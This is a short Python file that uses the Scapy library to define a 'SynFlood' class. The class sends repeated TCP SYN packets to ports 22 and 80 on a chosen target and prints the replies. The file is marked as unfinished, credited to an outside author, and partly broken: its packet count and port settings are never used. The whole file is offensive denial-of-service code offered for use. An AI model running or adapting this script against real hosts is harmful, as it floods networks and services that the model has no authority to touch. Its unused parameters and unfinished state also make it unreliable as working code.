# All credit for this attack goes to Subodh Pachghare (HaX0R Cyberninja) from www.thesubodh.com
# TO BE IMPLMENETED
from scapy.all import *


class SynFlood(object):
    def __init__(self, target, port=135):
        self.target = target
        self.port = port

    def launch(self, count=2000):
        p = IP(dst=self.target, id=1111, ttl=99)/TCP(sport=RandShort(), dport=[22, 80], seq=12345, ack=1000, window=1000, flags="S")/"Payload"
        ans, unans = srloop(p, inter=0.3, retry=2, timeout=4)
        print "Summary of answered & unanswered packets"
        ans.summary()
        unans.summary()
        print "source port flags in response"
        ans.make_table(lambda(s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
